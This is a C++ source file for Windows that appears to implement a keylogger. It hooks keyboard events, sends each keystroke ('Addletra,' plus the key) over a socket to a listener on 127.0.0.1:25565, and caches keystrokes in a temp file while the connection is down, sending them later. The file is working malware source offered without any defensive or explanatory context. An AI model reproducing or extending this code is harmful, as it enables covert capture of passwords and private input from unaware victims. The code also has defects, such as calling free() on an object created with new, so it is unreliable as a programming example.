#include <stdio.h>  
#include <time.h>
#include <string.h>
#include "EasySocket.h"
#include "EventsKeyList.h"
using namespace std;
WSADATA dll;
EasySocket *Conexao;
bool Tmp = false;
void tratamentosoc(void *arg){

}
void tentarconectar(void *arg){
	Conexao = new EasySocket("127.0.0.1",25565,tratamentosoc);
	Conexao->conectar();
}


void tratamento(void *arg){
    int *x=(int*)arg;
	if(!Conexao->isClosed()){
		if(Tmp){
			FILE *temp=fopen("temp.temp","a+");
			char msg[2048];
			memset(msg,0x0,sizeof(msg));
			while(fscanf(temp,"%s\n",msg)!=EOF){
				Conexao->Enviar(string(msg));
				memset(msg,0x0,sizeof(msg));
			}
			fclose(temp);
			Tmp=false;
			temp=fopen("temp.temp","w");
			fclose(temp);
		}
		if(KeyMap::Key[(*x)]!=""){
			string msg ="Addletra,"+KeyMap::Key[(*x)]; 
			Conexao->Enviar(msg);
		}
	}else{
		if(KeyMap::Key[(*x)]!=""){
			FILE *temp=fopen("temp.temp","a+");
			fprintf(temp,"%s",string("Addletra,"+KeyMap::Key[(*x)]+"\n").c_str());
			fclose(temp);
			free(Conexao);
			_beginthread(tentarconectar,0,NULL);
		}
	}
}

int main() {
	Events x;
	KeyMap k;
	WSAStartup(MAKEWORD(2,2), &dll);
	Conexao = new EasySocket("127.0.0.1",25565,tratamentosoc);
	Conexao->conectar();
	x.OnKeyMonitor(tratamento);
	int z;
	while(1){
		cin >> z;
	}
    return 0;
}